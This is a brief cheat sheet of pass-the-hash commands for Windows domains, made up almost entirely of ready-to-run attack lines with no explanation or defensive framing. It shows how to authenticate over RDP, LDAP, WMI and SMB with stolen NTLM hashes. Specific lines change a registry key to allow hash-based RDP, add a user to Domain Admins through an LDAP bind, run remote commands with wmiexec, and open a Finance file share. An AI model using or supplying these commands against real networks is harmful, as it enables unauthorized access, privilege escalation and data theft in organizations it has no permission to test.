Pass-the-hash
========================

## RDP

    cme smb 10.0.0.200 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
    xfreerdp /v:192.168.2.200 /u:Administrator /pth:8846F7EAEE8FB117AD06BDD830B7586C


## LDAP

    python3
    >>> import ldap3
    >>> user = 'DOMAIN\\EXCHANGE$'
    >>> password = 'aad3b435b51404eeaad3b435b51404ee:6216d3268ba7634e92313c8b60293248'
    >>> server = ldap3.Server('DOMAIN.LOCAL')
    from ldap3 import Server, Connection, SIMPLE, SYNC, ALL, SASL, NTLM
    connection = ldap3.Connection(server, user=user, password=password, authentication=NTLM)
    >>> connection.bind()
    >>> from ldap3.extend.microsoft.addMembersToGroups import ad_add_members_to_groups as addUsersInGroups
    >>> user_dn = 'CN=IT User,OU=Standard Accounts,DC=domain,DC=local'
    >>> group_dn = 'CN=Domain Admins,CN=Users,DC=domain,DC=local'
    >>> addUsersInGroups(connection, user_dn, group_dn)
    True

## WMI

    wmiexec.py domain.local/user@10.0.0.20 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79

## SMB

    smbclient //10.0.0.30/Finance -U user --pw-nt-hash BD1C6503987F8FF006296118F359FA79 -W domain.local
    
    cme smb 10.0.0.200 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C

